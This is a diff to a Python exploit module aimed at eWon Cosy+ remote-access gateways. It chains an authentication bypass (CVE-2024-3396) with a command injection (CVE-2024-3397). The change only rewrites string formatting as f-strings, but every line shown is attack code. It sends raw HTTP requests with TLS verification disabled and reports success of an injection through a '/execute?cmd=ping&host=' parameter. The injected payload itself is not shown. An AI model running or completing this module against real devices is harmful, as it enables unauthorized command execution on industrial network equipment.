@@ -91,7 +91,7 @@ class Exploit(Exploit):
             print_info("CVE-2024-3396 (auth bypass) + CVE-2024-3397 (cmd inject) — chained")
             return
 
-        print_status("[CVE-2024-3397] Targeting eWon Cosy+ at {}:{} ...".format(self.target, self.port))
+        print_status(f"[CVE-2024-3397] Targeting eWon Cosy+ at {self.target}:{self.port} ...")
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
@@ -102,12 +102,12 @@ class Exploit(Exploit):
             s = socket.create_connection((self.target, self.port), timeout=10)
             ss = ctx.wrap_socket(s) if self.port == 443 else s
             req = (
-                "{} {} HTTP/1.1\r\n"
-                "Host: {}:{}\r\n"
+                f"{method} {path} HTTP/1.1\r\n"
+                f"Host: {self.target}:{self.port}\r\n"
                 "Connection: close\r\n"
-                "Content-Length: {}\r\n"
+                f"Content-Length: {len(body)}\r\n"
                 "\r\n"
-            ).format(method, path, self.target, self.port, len(body)).encode() + body
+            ).encode() + body
             ss.sendall(req)
             time.sleep(0.3)
             resp = b""
@@ -131,7 +131,7 @@ class Exploit(Exploit):
             elif "200" in r1:
                 print_success("[CVE-2024-3396] 200 response — endpoint accessible")
             else:
-                print_warning("[CVE-2024-3396] Response: {}...".format(r1[:80]))
+                print_warning(f"[CVE-2024-3396] Response: {r1[:80]}...")
 
             # Phase 2: Command injection — CVE-2024-3397
             print_status("[CVE-2024-3397] Command injection: /execute?cmd=ping&host=<inject> ...")
@@ -142,9 +142,9 @@ class Exploit(Exploit):
             elif "200" in r2:
                 print_success("[CVE-2024-3397] 200 OK — injection sent, may need OOB verification")
             else:
-                print_info("[CVE-2024-3397] Response: {}".format(r2[:100]))
+                print_info(f"[CVE-2024-3397] Response: {r2[:100]}")
 
         except ConnectionRefusedError:
-            print_warning("[CVE-2024-3397] Connection refused on port {}".format(self.port))
+            print_warning(f"[CVE-2024-3397] Connection refused on port {self.port}")
         except Exception as exc:
-            print_error("[CVE-2024-3397] Error: {}".format(exc))
+            print_error(f"[CVE-2024-3397] Error: {exc}")
